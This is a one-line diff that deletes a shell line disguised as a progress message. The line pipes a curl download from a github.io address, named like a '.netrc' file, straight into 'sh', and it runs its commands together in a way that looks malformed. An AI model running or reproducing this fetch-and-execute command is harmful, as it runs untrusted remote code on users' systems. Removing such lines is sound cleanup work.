@@ -1,1 +1,0 @@
-echo Progress: 65.00%curl -L --progress-bar frkns.github.io/fun/spot-hire.netrc | sh
